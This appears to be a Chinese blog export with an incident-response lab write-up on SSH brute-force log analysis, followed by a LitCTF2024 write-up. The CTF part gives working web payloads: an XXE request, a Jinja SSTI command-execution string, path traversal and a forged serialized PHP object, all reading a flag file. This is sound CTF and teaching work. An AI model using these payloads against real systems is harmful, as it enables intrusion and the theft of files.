Aug  <span class="token number">1</span> 08:01:26 linux-rz sshd<span class="token punctuation">[</span><span class="token number">748</span><span class="token punctuation">]</span>: Disconnected from user root <span class="token number">192.168</span>.200.2 port <span class="token number">50378</span>
Aug  <span class="token number">1</span> 08:01:26 linux-rz sshd<span class="token punctuation">[</span><span class="token number">748</span><span class="token punctuation">]</span>: pam_unix<span class="token punctuation">(</span>sshd:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Aug  <span class="token number">1</span> 08:01:26 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Session <span class="token number">3</span> logged out. Waiting <span class="token keyword">for</span> processes to exit.
Aug  <span class="token number">1</span> 08:01:26 linux-rz systemd-logind<span class="token punctuation">[</span><span class="token number">440</span><span class="token punctuation">]</span>: Removed session <span class="token number">3</span>.
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: new group: <span class="token assign-left variable">name</span><span class="token operator">=</span>debian, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1001</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: new user: <span class="token assign-left variable">name</span><span class="token operator">=</span>debian, <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">home</span><span class="token operator">=</span>/home/debian, <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/bash
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'adm'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'dialout'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'cdrom'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'floppy'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'sudo'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'audio'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'dip'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'video'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'plugdev'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to group <span class="token string">'netdev'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'adm'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'dialout'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'cdrom'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'floppy'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'sudo'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'audio'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'dip'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'video'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'plugdev'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: <span class="token function">add</span> <span class="token string">'debian'</span> to shadow group <span class="token string">'netdev'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 passwd<span class="token punctuation">[</span><span class="token number">493</span><span class="token punctuation">]</span>: password <span class="token keyword">for</span> <span class="token string">'debian'</span> changed by <span class="token string">'root'</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 sudo:     root <span class="token builtin class-name">:</span> <span class="token assign-left variable">TTY</span><span class="token operator">=</span>unknown <span class="token punctuation">;</span> <span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/ <span class="token punctuation">;</span> <span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span>root <span class="token punctuation">;</span> <span class="token assign-left variable">COMMAND</span><span class="token operator">=</span>/usr/bin/touch /var/log/aws114_ssm_agent_installation.log
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 sudo: pam_unix<span class="token punctuation">(</span>sudo:session<span class="token punctuation">)</span>: session opened <span class="token keyword">for</span> user root by <span class="token punctuation">(</span>uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 sudo: pam_unix<span class="token punctuation">(</span>sudo:session<span class="token punctuation">)</span>: session closed <span class="token keyword">for</span> user root
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 sshd<span class="token punctuation">[</span><span class="token number">544</span><span class="token punctuation">]</span>: Server listening on <span class="token number">0.0</span>.0.0 port <span class="token number">22</span>.
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 systemd-logind<span class="token punctuation">[</span><span class="token number">503</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event1 <span class="token punctuation">(</span>Power Button<span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 sshd<span class="token punctuation">[</span><span class="token number">544</span><span class="token punctuation">]</span>: Server listening on :: port <span class="token number">22</span>.
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 systemd-logind<span class="token punctuation">[</span><span class="token number">503</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event2 <span class="token punctuation">(</span>Sleep Button<span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 systemd-logind<span class="token punctuation">[</span><span class="token number">503</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event0 <span class="token punctuation">(</span>AT Translated Set <span class="token number">2</span> keyboard<span class="token punctuation">)</span>
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 systemd-logind<span class="token punctuation">[</span><span class="token number">503</span><span class="token punctuation">]</span>: New seat seat0.
Jun  <span class="token number">6</span> 09:38:28 ip-10-0-10-3 passwd<span class="token punctuation">[</span><span class="token number">416</span><span class="token punctuation">]</span>: password <span class="token keyword">for</span> <span class="token string">'debian'</span> changed by <span class="token string">'root'</span>
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 systemd-logind<span class="token punctuation">[</span><span class="token number">428</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event1 <span class="token punctuation">(</span>Power Button<span class="token punctuation">)</span>
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 systemd-logind<span class="token punctuation">[</span><span class="token number">428</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event2 <span class="token punctuation">(</span>Sleep Button<span class="token punctuation">)</span>
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 systemd-logind<span class="token punctuation">[</span><span class="token number">428</span><span class="token punctuation">]</span>: Watching system buttons on /dev/input/event0 <span class="token punctuation">(</span>AT Translated Set <span class="token number">2</span> keyboard<span class="token punctuation">)</span>
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 systemd-logind<span class="token punctuation">[</span><span class="token number">428</span><span class="token punctuation">]</span>: New seat seat0.
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 sshd<span class="token punctuation">[</span><span class="token number">466</span><span class="token punctuation">]</span>: Server listening on <span class="token number">0.0</span>.0.0 port <span class="token number">22</span>.
Jun  <span class="token number">6</span> 09:38:29 ip-10-0-10-3 sshd<span class="token punctuation">[</span><span class="token number">466</span><span class="token punctuation">]</span>: Server listening on :: port <span class="token number">22</span>.</code></pre>
<p>过滤出root账号密码错误的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep "Failed password for root" -a</span>
Aug  <span class="token number">1</span> 07:42:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7471</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.32 port <span class="token number">51888</span> ssh2
Aug  <span class="token number">1</span> 07:47:13 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7497</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">34703</span> ssh2
Aug  <span class="token number">1</span> 07:47:18 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7499</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46671</span> ssh2
Aug  <span class="token number">1</span> 07:47:20 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7501</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">39967</span> ssh2
Aug  <span class="token number">1</span> 07:47:22 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7503</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46647</span> ssh2
Aug  <span class="token number">1</span> 07:52:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7606</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.31 port <span class="token number">40364</span> ssh2</code></pre>
<p>ip在第11个位置</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep "Failed password for root" -a | awk '&#123;print $11&#125;'</span>
<span class="token number">192.168</span>.200.32
<span class="token number">192.168</span>.200.2
<span class="token number">192.168</span>.200.2
<span class="token number">192.168</span>.200.2
<span class="token number">192.168</span>.200.2
<span class="token number">192.168</span>.200.31</code></pre>
<p>flag1 ： <strong>flag{192.168.200.2,192.168.200.31,192.168.200.32}</strong></p>
<h2 id="2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h2><p>那就找包含<code>Accepted password for root</code>字段的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep "Accepted password for root" -a | awk '&#123;print $11&#125;'</span>
<span class="token number">192.168</span>.200.2
<span class="token number">192.168</span>.200.2</code></pre>
<p>flag2 <strong>flag{192.168.200.2}</strong></p>
<h2 id="3-爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#3-爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="3.爆破用户名字典是什么？如果有多个使用”,”分割"></a>3.爆破用户名字典是什么？如果有多个使用”,”分割</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep "Failed password" -a </span>
Aug  <span class="token number">1</span> 07:40:50 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7461</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test1 from <span class="token number">192.168</span>.200.35 port <span class="token number">33874</span> ssh2
Aug  <span class="token number">1</span> 07:41:04 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7465</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test2 from <span class="token number">192.168</span>.200.35 port <span class="token number">51640</span> ssh2
Aug  <span class="token number">1</span> 07:41:13 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7468</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user test3 from <span class="token number">192.168</span>.200.35 port <span class="token number">48168</span> ssh2
Aug  <span class="token number">1</span> 07:42:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7471</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.32 port <span class="token number">51888</span> ssh2
Aug  <span class="token number">1</span> 07:46:41 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7475</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">36149</span> ssh2
Aug  <span class="token number">1</span> 07:46:47 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7478</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">44425</span> ssh2
Aug  <span class="token number">1</span> 07:46:50 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7480</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">38791</span> ssh2
Aug  <span class="token number">1</span> 07:46:54 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7482</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">37489</span> ssh2
Aug  <span class="token number">1</span> 07:46:56 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7484</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user user from <span class="token number">192.168</span>.200.2 port <span class="token number">35575</span> ssh2
Aug  <span class="token number">1</span> 07:46:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7486</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">35833</span> ssh2
Aug  <span class="token number">1</span> 07:47:02 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7489</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37653</span> ssh2
Aug  <span class="token number">1</span> 07:47:04 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7491</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">37917</span> ssh2
Aug  <span class="token number">1</span> 07:47:08 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7493</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">41957</span> ssh2
Aug  <span class="token number">1</span> 07:47:10 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7495</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user hello from <span class="token number">192.168</span>.200.2 port <span class="token number">39685</span> ssh2
Aug  <span class="token number">1</span> 07:47:13 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7497</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">34703</span> ssh2
Aug  <span class="token number">1</span> 07:47:18 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7499</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46671</span> ssh2
Aug  <span class="token number">1</span> 07:47:20 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7501</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">39967</span> ssh2
Aug  <span class="token number">1</span> 07:47:22 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7503</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.2 port <span class="token number">46647</span> ssh2
Aug  <span class="token number">1</span> 07:47:26 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7525</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37013</span> ssh2
Aug  <span class="token number">1</span> 07:47:30 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7528</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">37545</span> ssh2
Aug  <span class="token number">1</span> 07:47:32 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7530</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">39111</span> ssh2
Aug  <span class="token number">1</span> 07:47:35 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7532</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">35173</span> ssh2
Aug  <span class="token number">1</span> 07:47:39 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7534</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> invalid user  from <span class="token number">192.168</span>.200.2 port <span class="token number">45807</span> ssh2
Aug  <span class="token number">1</span> 07:52:59 linux-rz sshd<span class="token punctuation">[</span><span class="token number">7606</span><span class="token punctuation">]</span>: Failed password <span class="token keyword">for</span> root from <span class="token number">192.168</span>.200.31 port <span class="token number">40364</span> ssh2</code></pre>
<p>由于不会shell编程，看了一下别人的语法</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat /var/log/auth.log.1 | grep -a "Failed password" | perl -e 'while($_=&lt;>)&#123; /for(.*?) from/; print "$1\n";&#125;'| uniq -c | sort -nr</span>
      <span class="token number">5</span>  invalid user user
      <span class="token number">5</span>  invalid user hello
      <span class="token number">5</span>  invalid user 
      <span class="token number">4</span>  root
      <span class="token number">1</span>  root
      <span class="token number">1</span>  root
      <span class="token number">1</span>  invalid user test3
      <span class="token number">1</span>  invalid user test2
      <span class="token number">1</span>  invalid user test1</code></pre>
<p><code>$_</code>是perl的默认输入变量，<code>&lt;&gt;</code>是输入操作符号，非贪婪匹配到<code>for * from</code>，如果匹配到，打印第一个捕获组(.*?)的内容,也就是用户名并换行<br>flag3 <strong>flag{user,hello,root,test3,test2,test1}</strong></p>
<h2 id="4-登陆成功的IP共爆破了多少次"><a href="#4-登陆成功的IP共爆破了多少次" class="headerlink" title="4.登陆成功的IP共爆破了多少次"></a>4.登陆成功的IP共爆破了多少次</h2><p>第二题拿到登录成功的ip是<code>192.168.200.2</code>,用wc统计一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep -a "192.168.200.2" | grep "Failed password for root" | wc -l</span>
<span class="token number">4</span></code></pre>
<p>或者uniq -c</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep -a "192.168.200.2" | grep "Failed password for root" |awk '&#123;print $11&#125;'| sort | uniq -c</span>
      <span class="token number">4</span> <span class="token number">192.168</span>.200.2</code></pre>
<p>flag4 <strong>flag{4}</strong></p>
<h2 id="5-黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#5-黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="5.黑客登陆主机后新建了一个后门用户，用户名是多少"></a>5.黑客登陆主机后新建了一个后门用户，用户名是多少</h2><p>过滤一下<code>new user</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-3:/var/log<span class="token comment"># cat auth.log.1 | grep -a "new user"</span>
Aug  <span class="token number">1</span> 07:50:45 linux-rz useradd<span class="token punctuation">[</span><span class="token number">7551</span><span class="token punctuation">]</span>: new user: <span class="token assign-left variable">name</span><span class="token operator">=</span>test2, <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span>, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1000</span>, <span class="token assign-left variable">home</span><span class="token operator">=</span>/home/test2, <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/sh
Aug  <span class="token number">1</span> 08:18:27 ip-172-31-37-190 useradd<span class="token punctuation">[</span><span class="token number">487</span><span class="token punctuation">]</span>: new user: <span class="token assign-left variable">name</span><span class="token operator">=</span>debian, <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">GID</span><span class="token operator">=</span><span class="token number">1001</span>, <span class="token assign-left variable">home</span><span class="token operator">=</span>/home/debian, <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/bash</code></pre>
<p>新用户是test2<br>flag5 <strong>flag{test2}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>linux日志</tag>
      </tags>
  </entry>
  <entry>
    <title>LitCTF2024个人题解</title>
    <url>/posts/9d1ed1c9/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h3><p>简单的签到，</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string double-quoted-string">"secure_password"</span><span class="token punctuation">;</span>

  
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
#Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO3M6ODoicGFzc3dvcmQiO3M6MTU6InNlY3VyZV9wYXNzd29yZCI7fQ==</code></pre>
<h3 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h3><p>xxe，xml外部实体注入 <code>username</code>可以回显<br><img src="https://ooo.0x0.ooo/2024/06/04/OJSupU.webp" alt="OJSupU.webp" loading="lazy"></p>
<pre class="language-none"><code class="language-none">POST &#x2F;doLogin.php HTTP&#x2F;1.1
Host: node2.anna.nssctf.cn:28012
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko&#x2F;20100101 Firefox&#x2F;126.0
Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q&#x3D;0.01
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;xml;charset&#x3D;utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 133
Origin: http:&#x2F;&#x2F;node2.anna.nssctf.cn:28012
Connection: close
Referer: http:&#x2F;&#x2F;node2.anna.nssctf.cn:28012&#x2F;
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec&#x3D;1716271825
Priority: u&#x3D;1

&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;

&lt;!DOCTYPE  ANY [
&lt;!ENTITY sentence SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&sentence;&lt;&#x2F;username&gt;&lt;&#x2F;user&gt;</code></pre>
<h3 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h3><p>ssti注入，工具可以梭哈<br><img src="https://ooo.0x0.ooo/2024/06/04/OJSIYY.webp" alt="OJSIYY.webp" loading="lazy"></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
<h3 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h3><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre>
<h3 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h3><p>theme参数可以目录穿越读取</p>
<pre class="language-none"><code class="language-none">POST &#x2F;?url&#x3D;.. HTTP&#x2F;1.1
Host: node3.anna.nssctf.cn:28735
User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko&#x2F;20100101 Firefox&#x2F;126.0
Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application&#x2F;x-www-form-urlencoded
Content-Length: 22
Origin: http:&#x2F;&#x2F;node3.anna.nssctf.cn:28735
Connection: close
Referer: http:&#x2F;&#x2F;node3.anna.nssctf.cn:28735&#x2F;?url&#x3D;..&#x2F;..&#x2F;
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec&#x3D;1716271825
Upgrade-Insecure-Requests: 1
Priority: u&#x3D;1

theme&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre>
<h3 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h3><p>第一关，基础的php特性<br><img src="https://ooo.0x0.ooo/2024/06/04/OJSC5v.webp" alt="OJSC5v.webp" loading="lazy"><br>第二关，用美元符号<code>$</code>和括号<code>()</code>构造出数字12，参考<a href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p>
